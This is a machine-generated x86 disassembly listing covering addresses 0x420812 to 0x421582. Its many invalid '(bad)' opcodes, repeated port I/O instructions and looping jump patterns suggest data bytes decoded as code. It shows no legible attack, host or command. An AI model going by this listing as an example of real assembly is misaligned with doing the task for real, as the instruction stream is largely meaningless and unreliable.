  420812:	mov    al,ds:0xa4a05ca0
  420817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420818:	pop    eax
  420819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42081a:	test   al,0xa8
  42081c:	push   esp
  42081d:	test   al,0xac
  42081f:	lods   al,BYTE PTR ds:[esi]
  420820:	push   eax
  420821:	lods   al,BYTE PTR ds:[esi]
  420822:	mov    al,0xb0
  420824:	dec    esp
  420825:	mov    al,0xb4
  420827:	mov    ah,0x48
  420829:	mov    ah,0xb8
  42082b:	mov    eax,0xbcbcb844
  420830:	inc    eax
  420831:	mov    esp,0xc03cc0c0
  420836:	(bad)  
  420837:	les    edi,FWORD PTR [eax]
  420839:	(bad)  
  42083a:	enter  0x34c8,0xc8
  42083e:	int3   
  42083f:	int3   
  420840:	xor    ah,cl
  420842:	rcl    al,1
  420844:	sub    al,0xd0
  420846:	aam    0xd4
  420848:	sub    ah,dl
  42084a:	fcomp  st(0)
  42084c:	and    al,0xd8
  42084e:	(bad)  
  420850:	and    ah,bl
  420852:	loopne 0x420834
  420854:	sbb    al,0xe0
  420856:	in     al,0xe4
  420858:	sbb    ah,ah
  42085a:	call   0xed2a1d47
  42085f:	in     al,dx
  420860:	adc    ah,ch
  420862:	lock lock or al,0xf0
  420866:	hlt    
  420867:	hlt    
  420868:	or     ah,dh
  42086a:	clc    
  42086b:	clc    
  42086c:	add    al,0xf8
  42086e:	cld    
  42086f:	cld    
  420870:	add    ah,bh
	...
  420e7a:	add    BYTE PTR [eax],al
  420e7c:	adc    DWORD PTR [edx],ebx
  420e7e:	or     dh,BYTE PTR ds:0xa9110c06
  420e84:	push   es
  420e85:	pop    es
  420e86:	ret    
  420e87:	or     al,BYTE PTR [eax]
	...
  420edd:	add    BYTE PTR [eax],al
  420edf:	add    ch,ch
  420ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ee2:	xchg   esi,eax
  420ee3:	jae    0x420f2e
  420ee5:	scas   eax,DWORD PTR es:[edi]
  420ee6:	inc    ecx
  420ee7:	ja     0x420ec1
  420ee9:	cmp    eax,0xece831b3
  420eee:	in     al,dx
  420eef:	in     al,dx
  420ef0:	in     al,dx
  420ef1:	xlat   BYTE PTR ds:[ebx]
  420ef2:	cmc    
  420ef3:	ja     0x420f26
  420ef5:	call   0x762fbb69
  420efa:	xor    eax,ebp
  420efc:	ja     0x420f37
  420efe:	call   0x603e482a
  420f03:	(bad)  
  420f04:	ja     0x420f47
  420f06:	hlt    
  420f07:	out    dx,eax
  420f08:	inc    ecx
  420f09:	call   0xf03a4085
  420f0e:	xor    eax,ebp
  420f10:	jbe    0x420f06
  420f12:	je     0x420f0a
  420f14:	xlat   BYTE PTR ds:[ebx]
  420f15:	leave  
  420f16:	ja     0x420ee9
  420f18:	dec    ecx
  420f19:	scas   eax,DWORD PTR es:[edi]
  420f1a:	inc    ecx
  420f1b:	ja     0x420ef5
  420f1d:	ins    DWORD PTR es:[edi],dx
  420f1e:	fmul   st,st(4)
  420f20:	icebp  
  420f21:	in     al,dx
  420f22:	in     al,dx
  420f23:	mov    bl,0x71
  420f25:	inc    eax
  420f26:	jmp    0x420f13
  420f28:	jmp    0x420f16
  420f2a:	in     al,dx
  420f2b:	in     al,dx
  420f2c:	in     al,dx
  420f2d:	mov    bl,0x71
  420f2f:	test   dh,ah
  420f31:	jmp    0x420f1e
  420f33:	in     al,dx
  420f34:	in     al,dx
  420f35:	in     al,dx
  420f36:	in     al,dx
  420f37:	mov    bl,0x71
  420f39:	sub    al,0xe7
  420f3b:	jmp    0x420f28
  420f3d:	in     al,dx
  420f3e:	in     al,dx
  420f3f:	in     al,dx
  420f40:	in     al,dx
  420f41:	ja     0x420f74
  420f43:	hlt    
  420f44:	jne    0x420f77
  420f46:	test   BYTE PTR [edi+0x39],dh
  420f49:	clc    
  420f4a:	jne    0x420fc5
  420f4c:	inc    esp
  420f4d:	out    0xeb,eax
  420f4f:	jmp    0x420f04
  420f51:	jno    0x420f6b
  420f53:	jmp    0x420f40
  420f55:	jmp    0x420f43
  420f57:	in     al,dx
  420f58:	in     al,dx
  420f59:	in     al,dx
  420f5a:	mov    bl,0x71
  420f5c:	fs call 0xed2efb4d
  420f62:	in     al,dx
  420f63:	in     al,dx
  420f64:	mov    bl,0x71
  420f66:	push   esp
  420f67:	out    0xeb,eax
  420f69:	jmp    0x420f57
  420f6b:	in     al,dx
  420f6c:	in     al,dx
  420f6d:	in     al,dx
  420f6e:	mov    bl,0x71
  420f70:	jl     0x420f5a
  420f72:	jmp    0x420f5f
  420f74:	in     al,dx
  420f75:	in     al,dx
  420f76:	in     al,dx
  420f77:	in     al,dx
  420f78:	mov    bl,0x71
  420f7a:	push   0xecebebe8
  420f7f:	in     al,dx
  420f80:	in     al,dx
  420f81:	in     al,dx
  420f82:	mov    bl,0x71
  420f84:	sbb    al,0xeb
  420f86:	jmp    0x420f73
  420f88:	in     al,dx
  420f89:	in     al,dx
  420f8a:	in     al,dx
  420f8b:	in     al,dx
  420f8c:	mov    bl,0x71
  420f8e:	fsubr  st,st(0)
  420f90:	jmp    0x420f7d
  420f92:	in     al,dx
  420f93:	in     al,dx
  420f94:	in     al,dx
  420f95:	in     al,dx
  420f96:	mov    bl,0x71
  420f98:	dec    eax
  420f99:	out    0xeb,eax
  420f9b:	jmp    0x420f89
  420f9d:	in     al,dx
  420f9e:	in     al,dx
  420f9f:	in     al,dx
  420fa0:	mov    bl,0x71
  420fa2:	ins    BYTE PTR es:[edi],dx
  420fa3:	call   0xed2efb93
  420fa8:	in     al,dx
  420fa9:	in     al,dx
  420faa:	mov    bl,0x31
  420fac:	mov    esp,gs
  420fae:	in     al,dx
  420faf:	in     al,dx
  420fb0:	in     al,dx
  420fb1:	mov    bl,0x71
  420fb3:	pop    eax
  420fb4:	out    0xeb,eax
  420fb6:	jmp    0x420fa4
  420fb8:	in     al,dx
  420fb9:	in     al,dx
  420fba:	in     al,dx
  420fbb:	mov    bl,0x71
  420fbd:	and    bl,ch
  420fbf:	jmp    0x420fac
  420fc1:	in     al,dx
  420fc2:	in     al,dx
  420fc3:	in     al,dx
  420fc4:	in     al,dx
  420fc5:	mov    bl,0x71
  420fc7:	inc    esp
  420fc8:	jmp    0x420fb5
  420fca:	jmp    0x420fb8
  420fcc:	in     al,dx
  420fcd:	in     al,dx
  420fce:	in     al,dx
  420fcf:	mov    bl,0x71
  420fd1:	sub    al,0xeb
  420fd4:	jmp    0x420fc2
  420fd6:	in     al,dx
  420fd7:	in     al,dx
  420fd8:	in     al,dx
  420fd9:	mov    bl,0x71
  420fdb:	mov    dh,ah
  420fdd:	jmp    0x420fca
  420fdf:	in     al,dx
  420fe0:	in     al,dx
  420fe1:	in     al,dx
  420fe2:	in     al,dx
  420fe3:	ja     0x421016
  420fe5:	hlt    
  420fe6:	push   edx
  420fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fe8:	in     al,dx
  420fe9:	in     al,dx
  420fea:	jne    0x42105d
  420fec:	sub    al,0xeb
  420fef:	jmp    0x421043
  420ff1:	mov    bl,0x71
  420ff3:	dec    esp
  420ff4:	out    0xeb,eax
  420ff6:	jmp    0x421031
  420ff8:	inc    esi
  420ff9:	mov    bl,0x71
  420ffb:	js     0x420fe3
  420ffd:	jmp    0x420fea
  420fff:	in     al,dx
  421000:	in     al,dx
  421001:	in     al,dx
  421002:	in     al,dx
  421003:	xlat   BYTE PTR ds:[ebx]
  421004:	sti    
  421005:	ja     0x420f88
  421007:	js     0x420fef
  421009:	jmp    0x420ff6
  42100b:	outs   dx,DWORD PTR ds:[esi]
  42100c:	scas   al,BYTE PTR es:[edi]
  42100d:	in     eax,dx
  42100e:	jne    0x420f91
  421010:	js     0x420ff8
  421012:	jmp    0x420fff
  421014:	outs   dx,DWORD PTR ds:[esi]
  421015:	test   eax,0xebebe678
  42101a:	neg    BYTE PTR [edi+0x2b]
  42101d:	outs   dx,DWORD PTR ds:[esi]
  42101e:	test   eax,0xebebe688
  421023:	in     al,dx
  421024:	popa   
  421025:	and    bh,bl
  421027:	mov    ds:0xebe74c71,eax
  42102c:	jmp    0x4210a5
  42102e:	jns    0x420fb0
  421030:	call   0xa43dfc20
  421035:	std    
  421036:	daa    
  421037:	scas   al,BYTE PTR es:[edi]
  421038:	popa   
  421039:	cli    
  42103a:	ja     0x4210ad
  42103c:	sub    al,0xeb
  42103f:	jmp    0x4210b6
  421041:	jno    0x420fcb
  421043:	out    0xeb,al
  421045:	jmp    0x42101e
  421047:	(bad)  
  421048:	ja     0x4210c3
  42104a:	sub    al,0xeb
  42104d:	jmp    0x4210bc
  42104f:	aad    0xec
  421051:	in     al,dx
  421052:	in     eax,dx
  421053:	in     al,dx
  421054:	jne    0x4210cf
  421056:	sub    al,0xeb
  421059:	jmp    0x421032
  42105b:	xchg   ebp,eax
  42105c:	mov    dl,0x71
  42105e:	dec    eax
  42105f:	jmp    0x42104c
  421061:	jmp    0x421096
  421063:	mov    dl,0x71
  421065:	dec    ecx
  421066:	jmp    0x421053
  421068:	jmp    0x4210bb
  42106a:	mov    dl,0x71
  42106c:	dec    edx
  42106d:	jmp    0x42105a
  42106f:	jmp    0x4210d1
  421071:	mov    dl,0x71
  421073:	dec    ebx
  421074:	jmp    0x421061
  421076:	jmp    0x4210b1
  421078:	mov    dl,0x71
  42107a:	dec    esp
  42107b:	jmp    0x421068
  42107d:	jmp    0x4210da
  42107f:	mov    dl,0x71
  421081:	dec    ebp
  421082:	jmp    0x42106f
  421084:	jmp    0x4210d6
  421086:	mov    dl,0x71
  421088:	dec    esi
  421089:	jmp    0x421076
  42108b:	jmp    0x4210ee
  42108d:	mov    dl,0x71
  42108f:	dec    edi
  421090:	jmp    0x42107d
  421092:	jmp    0x4210ec
  421094:	mov    dl,0x71
  421096:	push   eax
  421097:	jmp    0x421084
  421099:	jmp    0x4210ec
  42109b:	mov    dl,0x71
  42109d:	push   ecx
  42109e:	jmp    0x42108b
  4210a0:	jmp    0x4210d6
  4210a2:	mov    dl,0x71
  4210a4:	push   edx
  4210a5:	jmp    0x421092
  4210a7:	jmp    0x4210f6
  4210a9:	mov    dl,0x71
  4210ab:	push   ebx
  4210ac:	jmp    0x421099
  4210ae:	jmp    0x42110a
  4210b0:	mov    dl,0x71
  4210b2:	push   esp
  4210b3:	jmp    0x4210a0
  4210b5:	jmp    0x421107
  4210b7:	mov    dl,0x71
  4210b9:	push   ebp
  4210ba:	jmp    0x4210a7
  4210bc:	jmp    0x421116
  4210be:	mov    dl,0x71
  4210c0:	push   esi
  4210c1:	jmp    0x4210ae
  4210c3:	jmp    0x421116
  4210c5:	mov    dl,0x71
  4210c7:	push   edi
  4210c8:	jmp    0x4210b5
  4210ca:	jmp    0x4210f9
  4210cc:	mov    dl,0x71
  4210ce:	pop    eax
  4210cf:	jmp    0x4210bc
  4210d1:	jmp    0x4210bf
  4210d3:	jns    0x421056
  4210d5:	dec    eax
  4210d6:	jmp    0x4210c3
  4210d8:	jmp    0x421118
  4210da:	ja     0x42114d
  4210dc:	mov    dh,ah
  4210de:	jmp    0x4210cb
  4210e0:	cmp    al,0xeb
  4210e2:	add    DWORD PTR [edi+eiz*8-0x15],0x843175eb
  4210ea:	mov    bl,0x31
  4210ec:	nop
  4210ed:	pop    esi
  4210ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210ef:	in     al,dx
  4210f0:	in     al,dx
  4210f1:	mov    bl,0x31
  4210f3:	xchg   esp,eax
  4210f4:	in     al,dx
  4210f5:	in     al,dx
  4210f6:	in     al,dx
  4210f7:	in     al,dx
  4210f8:	mov    bl,0x31
  4210fa:	cwde   
  4210fb:	in     al,dx
  4210fc:	in     al,dx
  4210fd:	in     al,dx
  4210fe:	in     al,dx
  4210ff:	mov    bl,0x31
  421101:	pushf  
  421102:	pop    edi
  421103:	int3   
  421104:	mov    ecx,0xa031b397
  421109:	pusha  
  42110a:	int3   
  42110b:	mov    ecx,0xa431b397
  421110:	popa   
  421111:	int3   
  421112:	mov    ecx,0xa831b397
  421117:	(bad)  
  421118:	int3   
  421119:	mov    ecx,0xac31b397
  42111e:	arpl   sp,cx
  421120:	mov    ecx,0xb031b397
  421125:	fs int3 
  421127:	mov    ecx,0xb431b397
  42112c:	gs int3 
  42112e:	mov    ecx,0xd871b397
  421133:	out    0xeb,al
  421135:	jmp    0x421123
  421137:	cmp    al,0xed
  421139:	in     al,dx
  42113a:	mov    bl,0x71
  42113c:	fsubr  st(6),st
  42113e:	jmp    0x42112b
  421140:	in     al,dx
  421141:	in     al,dx
  421142:	in     al,dx
  421143:	in     al,dx
  421144:	mov    bl,0x71
  421146:	loopne 0x42112e
  421148:	jmp    0x421135
  42114a:	in     al,dx
  42114b:	in     al,dx
  42114c:	in     al,dx
  42114d:	in     al,dx
  42114e:	mov    bl,0x71
  421150:	in     al,0xe6
  421152:	jmp    0x42113f
  421154:	outs   dx,DWORD PTR ds:[esi]
  421155:	int3   
  421156:	mov    ecx,0xe871b397
  42115b:	out    0xeb,al
  42115d:	jmp    0x4211cf
  42115f:	int3   
  421160:	mov    ecx,0xec71b397
  421165:	out    0xeb,eax
  421167:	jmp    0x4211da
  421169:	int3   
  42116a:	mov    ecx,0xf071b397
  42116f:	out    0xeb,eax
  421171:	jmp    0x4211e5
  421173:	int3   
  421174:	mov    ecx,0xf471b397
  421179:	out    0xeb,eax
  42117b:	jmp    0x4211f0
  42117d:	int3   
  42117e:	mov    ecx,0xf871b397
  421183:	out    0xeb,eax
  421185:	jmp    0x4211fb
  421187:	int3   
  421188:	mov    ecx,0xfc71b397
  42118d:	out    0xeb,eax
  42118f:	jmp    0x421206
  421191:	int3   
  421192:	mov    ecx,0xb831b397
  421197:	lock in al,dx
  421199:	in     al,dx
  42119a:	in     al,dx
  42119b:	mov    bl,0x31
  42119d:	mov    esp,0xecececec
  4211a2:	mov    bl,0x31
  4211a4:	shr    ah,0xec
  4211a7:	in     al,dx
  4211a8:	in     al,dx
  4211a9:	mov    bl,0x31
  4211ab:	(bad)  
  4211ac:	in     al,dx
  4211ad:	in     al,dx
  4211ae:	in     al,dx
  4211af:	in     al,dx
  4211b0:	mov    bl,0x31
  4211b2:	enter  0xecec,0xec
  4211b6:	in     al,dx
  4211b7:	mov    bl,0x31
  4211b9:	int3   
  4211ba:	in     al,dx
  4211bb:	in     al,dx
  4211bc:	in     al,dx
  4211bd:	in     al,dx
  4211be:	mov    bl,0x31
  4211c0:	shr    ah,1
  4211c2:	in     al,dx
  4211c3:	in     al,dx
  4211c4:	in     al,dx
  4211c5:	mov    bl,0x31
  4211c7:	aam    0xec
  4211c9:	in     al,dx
  4211ca:	in     al,dx
  4211cb:	in     al,dx
  4211cc:	mov    bl,0x31
  4211ce:	fsubr  st,st(4)
  4211d0:	in     al,dx
  4211d1:	in     al,dx
  4211d2:	in     al,dx
  4211d3:	mov    bl,0x31
  4211d5:	fsub   st(4),st
  4211d7:	in     al,dx
  4211d8:	in     al,dx
  4211d9:	in     al,dx
  4211da:	mov    dl,0x71
  4211dc:	test   al,ch
  4211de:	jmp    0x4211cb
  4211e0:	aaa    
  4211e1:	mov    dl,0x71
  4211e3:	mov    ebp,eax
  4211e5:	jmp    0x4211d2
  4211e7:	push   ds
  4211e8:	mov    dl,0x71
  4211ea:	mov    eax,gs
  4211ec:	jmp    0x4211d9
  4211ee:	sbb    dh,BYTE PTR [edx-0x1417728f]
  4211f4:	jmp    0x421246
  4211f6:	mov    dl,0x71
  4211f8:	xchg   eax,ebp
  4211fa:	jmp    0x4211e7
  4211fc:	pop    edx
  4211fd:	mov    dl,0x71
  4211ff:	mov    eax,ebp
  421201:	jmp    0x4211ee
  421203:	pop    eax
  421204:	mov    dl,0x71
  421206:	nop
  421207:	call   0xb32efdf7
  42120c:	jno    0x421198
  42120e:	call   0xb261fdfe
  421213:	jno    0x42119a
  421215:	call   0xb293fe05
  42121a:	jno    0x4211a2
  42121c:	call   0xb2a0fe0c
  421221:	jno    0x4211b1
  421223:	call   0xb29afe13
  421228:	jno    0x4211b9
  42122a:	call   0xb29afe1a
  42122f:	jno    0x4211b9
  421231:	call   0x7993fe21
  421236:	jns    0x4211bc
  421238:	call   0xeb7ffe28
  42123d:	inc    ecx
  42123e:	test   BYTE PTR [ebp+0x71],dh
  421241:	inc    eax
  421242:	jmp    0x42122f
  421244:	jmp    0x42129c
  421246:	in     al,dx
  421247:	jmp    0x42128a
  421249:	test   BYTE PTR [ebp+0x71],dh
  42124c:	test   dh,ah
  42124e:	jmp    0x42123b
  421250:	mov    dl,0x71
  421252:	mov    esi,fs
  421254:	jmp    0x421241
  421256:	inc    edx
  421257:	mov    dl,0x71
  421259:	xchg   ebx,eax
  42125a:	out    0xeb,al
  42125c:	jmp    0x42128b
  42125e:	mov    dl,0x71
  421260:	xchg   esp,eax
  421261:	out    0xeb,al
  421263:	jmp    0x4212bd
  421265:	mov    dl,0x71
  421267:	(bad)  
  421268:	out    0xeb,al
  42126a:	jmp    0x4212cc
  42126c:	mov    dl,0x71
  42126e:	nop
  42126f:	out    0xeb,al
  421271:	jmp    0x4212d4
  421273:	mov    dl,0x71
  421275:	xchg   ebp,eax
  421276:	out    0xeb,al
  421278:	jmp    0x4212d2
  42127a:	mov    dl,0x71
  42127c:	xchg   esi,eax
  42127d:	out    0xeb,al
  42127f:	jmp    0x4212dc
  421281:	mov    dl,0x71
  421283:	xchg   ecx,eax
  421284:	out    0xeb,al
  421286:	jmp    0x4212d5
  421288:	mov    dl,0x71
  42128a:	xchg   edx,eax
  42128b:	out    0xeb,al
  42128d:	jmp    0x4212e7
  42128f:	mov    dl,0x71
  421291:	(bad)  
  421292:	out    0xeb,al
  421294:	jmp    0x4212eb
  421296:	mov    dl,0x71
  421298:	mov    fs,esi
  42129a:	jmp    0x421287
  42129c:	pop    esi
  42129d:	mov    bl,0x71
  42129f:	xor    al,0xe7
  4212a1:	jmp    0x42128e
  4212a3:	in     al,dx
  4212a4:	in     al,dx
  4212a5:	in     al,dx
  4212a6:	in     al,dx
  4212a7:	mov    dl,0x71
  4212a9:	xchg   edi,eax
  4212aa:	out    0xeb,al
  4212ac:	jmp    0x4212fd
  4212ae:	mov    dl,0x71
  4212b0:	cwde   
  4212b1:	out    0xeb,al
  4212b3:	jmp    0x4212a1
  4212b5:	jns    0x421238
  4212b7:	mov    esi,fs
  4212b9:	jmp    0x4212a6
  4212bb:	ds ja  0x42132f
  4212be:	inc    eax
  4212bf:	jmp    0x4212ac
  4212c1:	jmp    0x4212ff
  4212c3:	jmp    0x421246
  4212c5:	inc    esp
  4212c6:	out    0xeb,eax
  4212c8:	jmp    0x42133f
  4212ca:	jno    0x42132c
  4212cc:	call   0x71f4febc
  4212d1:	xchg   ebx,eax
  4212d2:	out    0xeb,al
  4212d4:	jmp    0x421312
  4212d6:	mov    dl,0x71
  4212d8:	xchg   edi,eax
  4212d9:	out    0xeb,al
  4212db:	jmp    0x42132e
  4212dd:	mov    dl,0x71
  4212df:	cwde   
  4212e0:	out    0xeb,al
  4212e2:	jmp    0x421333
  4212e4:	mov    dl,0x71
  4212e6:	cdq    
  4212e7:	out    0xeb,al
  4212e9:	jmp    0x42134b
  4212eb:	mov    dl,0x71
  4212ed:	xchg   esp,eax
  4212ee:	out    0xeb,al
  4212f0:	jmp    0x421350
  4212f2:	mov    dl,0x71
  4212f4:	xchg   ebp,eax
  4212f5:	out    0xeb,al
  4212f7:	jmp    0x421354
  4212f9:	mov    dl,0x71
  4212fb:	xchg   esi,eax
  4212fc:	out    0xeb,al
  4212fe:	jmp    0x421360
  421300:	mov    dl,0x71
  421302:	call   0x7979:0xecebebe6
  421309:	mov    esi,fs
  42130b:	jmp    0x4212f8
  42130d:	cmp    eax,0xeb408177
  421312:	jmp    0x4212ff
  421314:	ds jmp 0x421298
  421317:	inc    esp
  421318:	out    0xeb,eax
  42131a:	jmp    0x421391
  42131c:	jno    0x4212f6
  42131e:	call   0x71f4ff0e
  421323:	xchg   ebx,eax
  421324:	out    0xeb,al
  421326:	jmp    0x42135a
  421328:	mov    dl,0x71
  42132a:	xchg   ebp,eax
  42132b:	out    0xeb,al
  42132d:	jmp    0x421380
  42132f:	mov    dl,0x71
  421331:	xchg   esi,eax
  421332:	out    0xeb,al
  421334:	jmp    0x421387
  421336:	mov    dl,0x71
  421338:	xchg   esp,eax
  421339:	out    0xeb,al
  42133b:	jmp    0x42139b
  42133d:	mov    dl,0x71
  42133f:	xchg   edi,eax
  421340:	out    0xeb,al
  421342:	jmp    0x421330
  421344:	jns    0x4213b7
  421346:	mov    esi,fs
  421348:	jmp    0x421335
  42134a:	cmp    al,0x77
  42134c:	jns    0x42138e
  42134e:	jmp    0x42133b
  421350:	jmp    0x42138f
  421352:	jmp    0x4212d5
  421354:	inc    esp
  421355:	out    0xeb,eax
  421357:	jmp    0x4213ce
  421359:	jno    0x4213a3
  42135b:	out    0xeb,eax
  42135d:	jmp    0x421311
  42135f:	jno    0x4212ee
  421361:	out    0xeb,al
  421363:	jmp    0x4213c0
  421365:	mov    dl,0x71
  421367:	mov    fs,esi
  421369:	jmp    0x421356
  42136b:	dec    ebp
  42136c:	mov    dl,0x71
  42136e:	(bad)  
  42136f:	out    0xeb,al
  421371:	jmp    0x4213c3
  421373:	mov    dl,0x71
  421375:	mov    esi,fs
  421377:	jmp    0x421364
  421379:	cmp    BYTE PTR [edx-0x14196f8f],dh
  42137f:	jmp    0x4213b9
  421381:	mov    dl,0x71
  421383:	xchg   esi,eax
  421384:	out    0xeb,al
  421386:	jmp    0x4213ed
  421388:	mov    dl,0x71
  42138a:	xchg   esp,eax
  42138b:	out    0xeb,al
  42138d:	jmp    0x4213dc
  42138f:	mov    dl,0x71
  421391:	xchg   ebp,eax
  421392:	out    0xeb,al
  421394:	jmp    0x4213f4
  421396:	mov    dl,0x71
  421398:	xchg   ecx,eax
  421399:	out    0xeb,al
  42139b:	jmp    0x4213f2
  42139d:	mov    dl,0x71
  42139f:	xchg   edx,eax
  4213a0:	out    0xeb,al
  4213a2:	jmp    0x4213f2
  4213a4:	mov    dl,0x71
  4213a6:	xchg   ebx,eax
  4213a7:	out    0xeb,al
  4213a9:	jmp    0x421409
  4213ab:	mov    dl,0x71
  4213ad:	xchg   edi,eax
  4213ae:	out    0xeb,al
  4213b0:	jmp    0x4213df
  4213b2:	mov    dl,0x71
  4213b4:	cwde   
  4213b5:	out    0xeb,al
  4213b7:	jmp    0x4213a5
  4213b9:	jns    0x42133c
  4213bb:	mov    esi,fs
  4213bd:	jmp    0x4213aa
  4213bf:	ds ja  0x421433
  4213c2:	inc    eax
  4213c3:	jmp    0x4213b0
  4213c5:	jmp    0x421403
  4213c7:	jmp    0x42134a
  4213c9:	inc    esp
  4213ca:	out    0xeb,eax
  4213cc:	jmp    0x421443
  4213ce:	jno    0x421400
  4213d0:	out    0xeb,eax
  4213d2:	jmp    0x421386
  4213d4:	jno    0x421432
  4213d6:	out    0xeb,eax
  4213d8:	jmp    0x42140d
  4213da:	mov    dl,0x71
  4213dc:	pop    ebp
  4213dd:	out    0xeb,eax
  4213df:	jmp    0x421432
  4213e1:	mov    dl,0x71
  4213e3:	pop    esi
  4213e4:	out    0xeb,eax
  4213e6:	jmp    0x421448
  4213e8:	mov    dl,0x71
  4213ea:	pop    edi
  4213eb:	out    0xeb,eax
  4213ed:	jmp    0x421427
  4213ef:	mov    dl,0x71
  4213f1:	pusha  
  4213f2:	out    0xeb,eax
  4213f4:	jmp    0x421443
  4213f6:	mov    dl,0x71
  4213f8:	popa   
  4213f9:	out    0xeb,eax
  4213fb:	jmp    0x42145c
  4213fd:	mov    dl,0x71
  4213ff:	(bad)  
  421400:	out    0xeb,eax
  421402:	jmp    0x421464
  421404:	mov    dl,0x71
  421406:	arpl   di,sp
  421408:	jmp    0x4213f5
  42140a:	xor    DWORD PTR [edx-0x14189b8f],esi
  421410:	jmp    0x421470
  421412:	mov    dl,0x71
  421414:	gs out 0xeb,eax
  421417:	jmp    0x421477
  421419:	mov    dl,0x71
  42141b:	out    0xeb,ax
  42141e:	jmp    0x42147b
  421420:	mov    dl,0x71
  421422:	addr16 out 0xeb,eax
  421425:	jmp    0x421485
  421427:	mov    dl,0x71
  421429:	push   0xecebebe7
  42142e:	mov    dl,0x71
  421430:	pop    esp
  421431:	jmp    0x42141e
  421433:	jmp    0x421464
  421435:	mov    dl,0x71
  421437:	pop    ebp
  421438:	jmp    0x421425
  42143a:	jmp    0x42149a
  42143c:	mov    dl,0x71
  42143e:	pop    esi
  42143f:	jmp    0x42142c
  421441:	jmp    0x421494
  421443:	mov    dl,0x71
  421445:	pop    edi
  421446:	jmp    0x421433
  421448:	jmp    0x421497
  42144a:	mov    dl,0x71
  42144c:	pusha  
  42144d:	jmp    0x42143a
  42144f:	jmp    0x4214b1
  421451:	mov    dl,0x71
  421453:	popa   
  421454:	jmp    0x421441
  421456:	jmp    0x4214a9
  421458:	mov    dl,0x71
  42145a:	(bad)  
  42145b:	jmp    0x421448
  42145d:	jmp    0x421490
  42145f:	mov    dl,0x71
  421461:	arpl   bx,bp
  421463:	jmp    0x421450
  421465:	bound  esi,QWORD PTR [edx-0x14149b8f]
  42146b:	jmp    0x4214be
  42146d:	mov    dl,0x71
  42146f:	gs jmp 0x42145d
  421472:	jmp    0x4214ce
  421474:	mov    dl,0x71
  421476:	data16 jmp 0x421464
  421479:	jmp    0x4214db
  42147b:	mov    dl,0x71
  42147d:	addr16 jmp 0x42146b
  421480:	jmp    0x4214af
  421482:	mov    dl,0x71
  421484:	push   0xecebebeb
  421489:	jns    0x421504
  42148b:	pop    esp
  42148c:	jmp    0x421479
  42148e:	jmp    0x4214cd
  421490:	ja     0x421413
  421492:	inc    eax
  421493:	jmp    0x421480
  421495:	jmp    0x4214d5
  421497:	jmp    0x42141a
  421499:	inc    esp
  42149a:	out    0xeb,eax
  42149c:	jmp    0x421513
  42149e:	jno    0x4214a4
  4214a0:	out    0xeb,eax
  4214a2:	jmp    0x42151d
  4214a4:	jno    0x421502
  4214a6:	out    0xeb,eax
  4214a8:	jmp    0x4214e6
  4214aa:	ja     0x421525
  4214ac:	inc    eax
  4214ad:	jmp    0x42149a
  4214af:	jmp    0x4214ee
  4214b1:	jmp    0x421434
  4214b3:	inc    esp
  4214b4:	out    0xeb,eax
  4214b6:	jmp    0x42152d
  4214b8:	jno    0x4214de
  4214ba:	jmp    0x4214a7
  4214bc:	jmp    0x421471
  4214be:	jno    0x42152c
  4214c0:	out    0xeb,eax
  4214c2:	jmp    0x4214b0
  4214c4:	in     al,dx
  4214c5:	in     al,dx
  4214c6:	in     al,dx
  4214c7:	mov    bl,0x71
  4214c9:	aam    0xe8
  4214cb:	jmp    0x4214b8
  4214cd:	in     al,dx
  4214ce:	in     al,dx
  4214cf:	in     al,dx
  4214d0:	in     al,dx
  4214d1:	mov    bl,0x71
  4214d3:	enter  0xebe8,0xeb
  4214d7:	in     al,dx
  4214d8:	in     al,dx
  4214d9:	in     al,dx
  4214da:	in     al,dx
  4214db:	mov    dl,0x71
  4214dd:	jo     0x4214c7
  4214df:	jmp    0x4214cc
  4214e1:	dec    eax
  4214e2:	mov    dl,0x71
  4214e4:	jno    0x4214ce
  4214e6:	jmp    0x4214d3
  4214e8:	in     al,dx
  4214e9:	mov    dl,0x71
  4214eb:	jo     0x4214d4
  4214ed:	jmp    0x4214da
  4214ef:	pop    edi
  4214f0:	mov    dl,0x71
  4214f2:	jno    0x4214db
  4214f4:	jmp    0x4214e1
  4214f6:	pop    ebp
  4214f7:	mov    dl,0x71
  4214f9:	jb     0x4214e2
  4214fb:	jmp    0x4214e8
  4214fd:	pop    eax
  4214fe:	mov    dl,0x71
  421500:	jae    0x4214e9
  421502:	jmp    0x4214ef
  421504:	pop    edi
  421505:	mov    dl,0x71
  421507:	je     0x4214f0
  421509:	jmp    0x4214f6
  42150b:	pop    esi
  42150c:	mov    dl,0x71
  42150e:	jne    0x4214f7
  421510:	jmp    0x4214fd
  421512:	bound  esi,QWORD PTR [edx-0x1418898f]
  421518:	jmp    0x421539
  42151a:	mov    dl,0x71
  42151c:	ja     0x421505
  42151e:	jmp    0x42150b
  421520:	push   ds
  421521:	mov    dl,0x71
  421523:	js     0x42150c
  421525:	jmp    0x421512
  421527:	sbb    dh,BYTE PTR [edx-0x1418868f]
  42152d:	jmp    0x42157f
  42152f:	mov    dl,0x71
  421531:	jp     0x42151a
  421533:	jmp    0x421520
  421535:	pop    eax
  421536:	mov    dl,0x71
  421538:	jnp    0x421521
  42153a:	jmp    0x421527
  42153c:	pop    eax
  42153d:	mov    dl,0x71
  42153f:	jl     0x421528
  421541:	jmp    0x42152e
  421543:	in     al,dx
  421544:	mov    dl,0x71
  421546:	sbb    al,0xe7
  421548:	jmp    0x421535
  42154a:	das    
  42154b:	mov    dl,0x71
  42154d:	sbb    eax,0x58ebebe7
  421552:	mov    dl,0x71
  421554:	push   ds
  421555:	out    0xeb,eax
  421557:	jmp    0x4215b4
  421559:	mov    dl,0x71
  42155b:	pop    ds
  42155c:	out    0xeb,eax
  42155e:	jmp    0x4215bf
  421560:	mov    dl,0x71
  421562:	and    bh,ah
  421564:	jmp    0x421551
  421566:	push   ecx
  421567:	mov    dl,0x71
  421569:	and    edi,esp
  42156b:	jmp    0x421558
  42156d:	xor    al,0xb2
  42156f:	jno    0x421593
  421571:	out    0xeb,eax
  421573:	jmp    0x4215c2
  421575:	mov    dl,0x71
  421577:	and    esp,edi
  421579:	jmp    0x421566
  42157b:	pop    edx
  42157c:	mov    dl,0x71
  42157e:	and    al,0xe7
  421580:	jmp    0x42156d
  421582:	push   eax
